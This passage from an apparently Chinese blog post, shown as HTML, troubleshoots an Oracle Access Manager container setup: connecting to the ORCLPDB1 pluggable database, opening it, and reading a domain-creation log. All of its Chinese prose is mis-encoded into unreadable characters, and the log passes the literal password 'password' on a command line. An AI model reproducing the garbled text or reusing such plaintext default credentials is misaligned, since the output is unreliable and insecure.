</span></span></code></pre></td></tr></table></div></div><p>ç»“æœ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>   CON_ID CON_NAME              OPEN MODE  RESTRICTED
</span></span><span style=display:flex><span>---------- ------------------------------ ---------- ----------
</span></span><span style=display:flex><span>     2 PDB$SEED              READ ONLY  NO
</span></span></code></pre></td></tr></table></div></div><p>æœç´¢ â€œhow to connect to pdb directlyâ€ ï¼Œå‚è€ƒ<a href=https://www.dell.com/support/kbdoc/zh-cn/000146485/%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5%E5%88%B0-oracle-rac-12cr1-%E4%B8%AD%E7%9A%84%E5%8F%AF%E6%8F%92%E6%8B%94%E6%95%B0%E6%8D%AE%E5%BA%93>æ­¤æ–‡</a> æƒ³åˆ°é€šè¿‡æ–°å»ºæœåŠ¡è¿æ¥åˆ°PDBã€‚ç„¶åæ³¨æ„åˆ°<code>/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­å·²ç»åŒ…æ‹¬ä¸¤ä¸ªServiceã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ORCLCDB =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLCDB.localdomain)     )   )
</span></span><span style=display:flex><span>ORCLPDB1 =   (DESCRIPTION =     (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = ORCLPDB1.localdomain)     )   )
</span></span></code></pre></td></tr></table></div></div><p>æ‰€ä»¥åªè¦ï¼Œåˆ›å»ºå®¹å™¨æ—¶<code>CONNECTION_STRING</code> ä½¿ç”¨ <code>172.17.0.1:1521/ORCLPDB1.localdomain</code> è€Œä¸æ˜¯ <code>172.17.0.1:1521/ORCLCDB.localdomain</code> å°±èƒ½è§£å†³è¿™ä¸ªé”™è¯¯ã€‚</p><h4 id=æŠ¥é”™ä¸‰æ— æ³•æ‰§è¡Œsql>æŠ¥é”™ä¸‰ï¼šæ— æ³•æ‰§è¡ŒSQL<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™ä¸‰æ— æ³•æ‰§è¡Œsql>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ERROR - RCU-6005 Unable to execute sql query.
</span></span><span style=display:flex><span>CAUSE - RCU-6005 Database not in open state.
</span></span><span style=display:flex><span>ACTION - RCU-6005 Make sure that the database is open.
</span></span></code></pre></td></tr></table></div></div><h4 id=è§£å†³ä¸‰æ‰“å¼€pdb>è§£å†³ä¸‰ï¼šæ‰“å¼€PDB<a hidden class=anchor aria-hidden=true href=#è§£å†³ä¸‰æ‰“å¼€pdb>#</a></h4><p>ä¸ºäº†è§£å†³æŠ¥é”™è€Œèƒ¡ä¹±æ“ä½œäº†æ•°æ®åº“ï¼Œå…¶ä¸­ä¸€ä¸ªåŠ¨ä½œå…³é—­äº†PDBï¼Œä»è€Œå¯¼è‡´äº†è¿™ä¸ªé”™è¯¯ã€‚æ‰“å¼€å®ƒå°±å¥½äº†ã€‚</p><p>SQL> <strong>select name,open_mode from v$pdbs;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>OPEN_MODE
</span></span><span style=display:flex><span>----------
</span></span><span style=display:flex><span>ORCLPDB1
</span></span><span style=display:flex><span>MOUNTED
</span></span></code></pre></td></tr></table></div></div><p>SQL> <strong>alter pluggable database ORCLPDB1 open;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Pluggable database altered.
</span></span></code></pre></td></tr></table></div></div><p>SQL> <strong>select name,open_mode from v$pdbs;</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>NAME
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span>OPEN_MODE
</span></span><span style=display:flex><span>----------
</span></span><span style=display:flex><span>ORCLPDB1
</span></span><span style=display:flex><span>READ WRITE
</span></span></code></pre></td></tr></table></div></div><h4 id=æŠ¥é”™å››åˆ›å»ºdomainå¤±è´¥>æŠ¥é”™å››ï¼šåˆ›å»ºdomainå¤±è´¥<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™å››åˆ›å»ºdomainå¤±è´¥>#</a></h4><p>æ—¥å¿—è¯¦æƒ…ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-66>66</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-67><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-67>67</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>RCUPREFIX=OAM1
</span></span><span style=display:flex><span>DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase...
</span></span><span style=display:flex><span>Configuring Domain for first time 
</span></span><span style=display:flex><span>Start the Admin and Managed Servers  
</span></span><span style=display:flex><span>=====================================
</span></span><span style=display:flex><span>Loading RCU Phase
</span></span><span style=display:flex><span>=================
</span></span><span style=display:flex><span>CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>RCUPREFIX=OAM1
</span></span><span style=display:flex><span>jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Creating Domain 1st execution
</span></span><span style=display:flex><span>Loading RCU into database with RCUPREFIX OAM1
</span></span><span style=display:flex><span>Domain Configuration Phase
</span></span><span style=display:flex><span>==========================
</span></span><span style=display:flex><span>/u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true
</span></span><span style=display:flex><span>Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Initializing WebLogic Scripting Tool (WLST) ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to WebLogic Server Administration Scripting Shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Type help() for help on available commands
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>create_domain.py called with the following inputs:
</span></span><span style=display:flex><span>INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py
</span></span><span style=display:flex><span>INFO: sys.argv[1] = -oh
</span></span><span style=display:flex><span>INFO: sys.argv[2] = /u01/oracle
</span></span><span style=display:flex><span>INFO: sys.argv[3] = -jh
</span></span><span style=display:flex><span>INFO: sys.argv[4] = /u01/jdk
</span></span><span style=display:flex><span>INFO: sys.argv[5] = -parent
</span></span><span style=display:flex><span>INFO: sys.argv[6] = /u01/oracle/user_projects/domains
</span></span><span style=display:flex><span>INFO: sys.argv[7] = -name
</span></span><span style=display:flex><span>INFO: sys.argv[8] = access_domain
</span></span><span style=display:flex><span>INFO: sys.argv[9] = -user
</span></span><span style=display:flex><span>INFO: sys.argv[10] = weblogic
</span></span><span style=display:flex><span>INFO: sys.argv[11] = -password
</span></span><span style=display:flex><span>INFO: sys.argv[12] = password
</span></span><span style=display:flex><span>INFO: sys.argv[13] = -rcuDb
</span></span><span style=display:flex><span>INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>INFO: sys.argv[15] = -rcuPrefix
</span></span><span style=display:flex><span>INFO: sys.argv[16] = OAM1
